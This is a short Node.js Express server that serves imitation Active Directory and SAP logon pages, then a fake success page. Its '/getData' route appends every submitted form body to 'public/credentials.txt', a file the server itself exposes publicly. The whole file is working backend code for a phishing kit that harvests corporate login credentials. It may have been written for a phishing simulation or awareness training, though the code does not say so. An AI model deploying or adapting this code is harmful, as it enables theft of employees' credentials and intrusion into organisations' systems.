const express = require("express");
const fs = require("fs");
const os = require("os");
const { engine } = require("express-handlebars");
const bodyParser = require("body-parser");

const app = express();
const port = 3000;

app.use(bodyParser.json());

//Serves static files (we need it to import a css file)
app.use(express.static("public"));

app.engine(
	"hbs",
	engine({
		defaultLayout: false,
		extname: ".hbs",
		layoutsDir: "views",
	})
);

app.set("view engine", "hbs");
// app.set("views", "./views");

app.get("/login", (req, res) => {
	res.render("loginAD");
});

app.get("/logon-sap", (req, res) => {
	res.render("logonSAP");
});

app.post("/getData", (req, res) => {
	fs.appendFile(
		"public/credentials.txt",
		JSON.stringify(req.body) + os.EOL,
		(err) => {
			if (err) {
				console.error(err);
			} else {
				res.json({ status: "success" });
			}
		}
	);
});

app.get("/logon-sap-success", (req, res) => {
	res.render("success");
});

app.listen(port, () => {
	console.log(`Example app listening on port http://localhost:${port}`);
});
